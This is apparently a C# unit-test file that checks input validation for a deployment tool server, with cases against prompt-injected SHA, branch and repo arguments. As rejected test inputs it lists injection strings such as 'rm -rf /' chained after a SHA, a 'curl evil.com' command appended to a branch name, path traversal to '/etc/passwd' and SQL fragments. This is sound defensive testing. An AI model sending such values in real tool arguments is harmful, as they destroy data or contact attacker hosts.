using DeploymentMcp.Services;
using FluentAssertions;
using Xunit;

namespace DeploymentMcp.Tests;

/// <summary>
/// Security-critical: these tests pin the input validation rules that
/// stop a prompt-injected tool argument from reaching Azure DevOps.
///
/// If you change the regex in <see cref="Validation"/>, you must update
/// these tests and re-justify the change in SECURITY.md.
/// </summary>
public class ValidationTests
{
    // ---- SHA -----------------------------------------------------------

    [Theory]
    [InlineData("a4f9c12")]                                     // 7 chars
    [InlineData("a4f9c12e")]                                    // 8 chars
    [InlineData("b1e3d847b1e3d847b1e3d847b1e3d847b1e3d847")]    // 40 chars
    [InlineData("ABCDEF1234567")]                               // mixed case hex
    public void IsValidSha_accepts_hex_in_range(string sha) =>
        Validation.IsValidSha(sha).Should().BeTrue();

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("abc")]                                         // too short
    [InlineData("a4f9c12e; rm -rf /")]                          // shell injection attempt
    [InlineData("a4f9c12e\n")]                                  // log injection / CRLF
    [InlineData("a4f9c12e' OR '1'='1")]                         // SQL-style injection
    [InlineData("../../etc/passwd")]                            // path traversal
    [InlineData("HEAD")]                                        // ref name, not a sha
    [InlineData("b1e3d847b1e3d847b1e3d847b1e3d847b1e3d847aa")]  // > 40
    [InlineData("zzzzzzz")]                                     // non-hex
    public void IsValidSha_rejects_unsafe(string? sha) =>
        Validation.IsValidSha(sha).Should().BeFalse();

    // ---- Branch --------------------------------------------------------

    [Theory]
    [InlineData("main")]
    [InlineData("release/2026.05")]
    [InlineData("feature/loyalty-program")]
    [InlineData("hotfix_123")]
    public void IsSafeBranch_accepts_normal_refs(string branch) =>
        Validation.IsSafeBranch(branch).Should().BeTrue();

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("../main")]                                     // path traversal
    [InlineData("main; curl evil.com")]                         // command chaining
    [InlineData("main\r\nrm -rf /")]                            // CRLF
    [InlineData("main?api-version=7.1")]                        // url meta
    [InlineData("main&x=y")]
    [InlineData("main with space")]
    [InlineData("main#fragment")]
    public void IsSafeBranch_rejects_unsafe(string? branch) =>
        Validation.IsSafeBranch(branch).Should().BeFalse();

    // Long branch — 201 chars (over the 200 cap).
    [Fact]
    public void IsSafeBranch_rejects_overlong() =>
        Validation.IsSafeBranch(new string('a', 201)).Should().BeFalse();

    // ---- Repo ----------------------------------------------------------

    [Theory]
    [InlineData("shop-api")]
    [InlineData("ShopWeb")]
    [InlineData("payments_v2")]
    public void IsSafeRepo_accepts_normal_names(string repo) =>
        Validation.IsSafeRepo(repo).Should().BeTrue();

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("shop/api")]                                    // slash not allowed in repo
    [InlineData("../other")]
    [InlineData("shop-api;DROP TABLE")]
    public void IsSafeRepo_rejects_unsafe(string? repo) =>
        Validation.IsSafeRepo(repo).Should().BeFalse();
}
